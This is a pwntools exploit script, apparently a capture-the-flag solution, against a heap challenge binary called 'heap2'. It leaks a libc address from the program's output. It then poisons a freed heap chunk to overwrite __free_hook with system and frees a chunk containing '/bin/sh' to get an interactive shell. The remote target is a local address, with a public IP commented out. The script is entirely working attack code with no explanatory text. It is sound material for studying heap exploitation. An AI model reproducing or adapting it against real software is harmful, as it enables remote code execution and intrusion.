from pwn import *


exe = ELF("heap2")
libc = ELF("./libc.so.6")
rop = ROP(exe)

context.binary = exe

# context.log_level = 'error'

def conn():
    if args.REMOTE:
        # r = remote("128.199.12.141", 7013)
        r = remote("127.0.0.1", 7017)
    else:
        r = exe.process()
        # r = gdb.debug(exe.path)
    return r


r = conn()

puts_addr = int(next(x for x in r.recvline().decode(errors='ignore').split() if x.startswith('0x')),16)
libc.address = puts_addr - libc.symbols['puts']
log.info(f"leaked libc address @ {hex(libc.address)}")

for i in range(1):
    r.sendline(b"1")
    r.sendline(str(i).encode())
    r.sendline(b"l" * 24) #username
    r.sendline(b"A" * 6)


for i in range(1):
    r.sendline(b"3")
    r.sendline(str(i).encode())


r.sendline(b"5")
r.sendline(b"0")
r.sendline(p64(libc.symbols['__free_hook']))


r.sendline(b"4")
r.sendline(b"hi")
r.sendline(b"4")
r.sendline(b"hi")

r.sendline(b"4")
r.sendline(p64(libc.symbols['system'] ))

r.sendline(b"1")
r.sendline(b"5")
r.sendline(b"/bin/sh") #username
r.sendline(b"A" * 6)

r.sendline(b"3")
r.sendline(b"5")

r.interactive()

# automate inputs as necessary here

r.interactive()
